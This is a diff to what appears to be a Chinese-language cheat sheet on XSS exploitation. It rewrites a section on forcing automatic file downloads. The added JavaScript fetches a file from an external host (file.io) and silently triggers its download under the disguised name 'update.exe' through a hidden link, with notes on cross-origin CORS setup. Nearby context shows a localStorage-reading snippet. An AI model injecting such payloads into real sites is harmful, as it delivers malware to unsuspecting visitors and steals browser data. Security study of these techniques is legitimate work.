@@ -494,34 +494,29 @@ for(var i = 0; i < localStorage.length; i++)
 localStorage.key(3);
 ```
 
-
 #### XSS利用方式 - 自动下载文件
 
-* 同域 - 如果在域`a.com`下载同域的文件,则无需考虑跨域.
-* 非同域 - 如果在域`a.com`下载非同域`file.io`的文件,需要"跨域",可设置`https://file.io/`的CORS策略,允许来自域`a.com`的跨域请求.
+* 待下载文件的位置
+  * 同域 - 在域`a.com` 如果下载同域的文件,则无需考虑跨域.
+  * 非同域 - 在域`a.com` 如果下载非同域`https://file.io`的文件,需要"跨域"
+    * 跨域方案1 - 设置`https://file.io/`的CORS策略,允许来自域`a.com`的跨域请求.
 
-在`a.com`下 自动下载文件 方式1:
-
-```html
-<a href="https://down.file.io/test" download="update.exe" id="downit"></a>
+在`a.com`下 自动下载文件
 ```
-
-```
-document.querySelectorAll("#downit")[0].click();
-```
-
-在`a.com`下 自动下载文件 方式2: 使用`fetch API`和`Blob(Binary large object)`对象
-
-```
-fetch('https://file.io/test').then(res => res.blob().then(blob => {
-    var a = document.createElement('a');
-    var url = window.URL.createObjectURL(blob);
-    var filename = 'myfile.zip';
-    a.href = url;
-    a.download = filename;
-    a.click();
-    window.URL.revokeObjectURL(url);
-}))
+// 使用`fetch API`和`Blob(Binary large object)`对象
+fetch('https://file.io/test')
+.then(resp => resp.blob())
+.then(blob => {
+const url = window.URL.createObjectURL(blob);
+const a = document.createElement('a');
+a.style.display = 'none';
+a.href = url;
+a.download = 'update.exe';// the filename showed
+document.body.appendChild(a);
+a.click();
+window.URL.revokeObjectURL(url);
+})
+.catch(() => console.log('download fail!'));
 ```
 
 #### XSS利用方式 - 读取本地文件
